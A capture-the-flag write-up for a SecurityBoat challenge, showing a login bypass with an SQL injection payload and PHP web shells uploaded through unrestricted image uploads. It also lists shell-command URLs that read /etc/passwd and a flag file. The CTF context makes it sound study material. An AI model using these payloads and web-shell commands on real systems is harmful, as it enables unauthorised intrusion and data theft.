# SecurityBoat CTF WriteUp - Jan 2024

Link for CTF: [http://ctf.securityboat.net/](http://ctf.securityboat.net/)

## Recon:

### Without Login:

1. Tried accessing `robot.txt` and `robots.txt`, but no files were found.
2. Brute-forced the URL with `feroxbuster`.
   ```
   feroxbuster -u http://ctf.securityboat.net/
   ```
   Interesting folders found: `admin`, `JS`, `assets`.

### With Login:

1. Registered to the site with admin credentials.
2. Logged in with admin credentials.
   - Username: admin11
   - Password: 123456789
3. Redirected to [http://ctf.securityboat.net/admin/dashboard.html](http://ctf.securityboat.net/admin/dashboard.html).
4. Bypassed the login panel using SQLi Injection to get admin dashboard.
   - Payload used for SQLi: `admin' or '1'='1`
5. Got access to the admin panel.

## Exploitation:

1. Checked all options in the admin dashboard; found parameters like description and name vulnerable to XSS attacks, and an image upload option for products.
2. For normal users, found an option to upload a profile picture.

### Admin User (File Upload via Edit-Products):

1. Uploaded PHP reverse shell in the image option in products.
   ![Admin|Edit-Products](http://ctf.securityboat.net/assets/products/payload.php)
2. Enumerated the system:
   - [List current directory](http://ctf.securityboat.net/assets/products/payload.php?cmd=pwd)
   - [Read `/etc/passwd`](http://ctf.securityboat.net/assets/products/payload.php?cmd=cat%20/etc/passwd)
   - [Change to `/home` directory and list contents](http://ctf.securityboat.net/assets/products/payload.php?cmd=cd%20/home;ls)
   - [Read `/home/flag.txt`](http://ctf.securityboat.net/assets/products/payload.php?cmd=cat%20/home/flag.txt)
   Flag: `{Unrestr!cted_F!le_Upload_!s_Fun}`

### Normal User (File Upload via Profile Pic):

1. Uploaded PHP reverse shell in the profile pic.
   [Profile Pic Shell](http://ctf.securityboat.net/assets/profPic/payload.php)
2. Enumerated the system:
   - [Read `/etc/passwd`](http://ctf.securityboat.net/assets/profPic/payload.php?cmd=cat%20/etc/passwd)
   - [Change to `/home` directory and list contents](http://ctf.securityboat.net/assets/profPic/payload.php?cmd=cd%20/home;ls)
   - [Read `/home/flag.txt`](http://ctf.securityboat.net/assets/profPic/payload.php?cmd=cat%20/home/flag.txt)
   Flag: `{Unrestr!cted_F!le_Upload_!s_Fun}`

I hope you find this writeup informative!
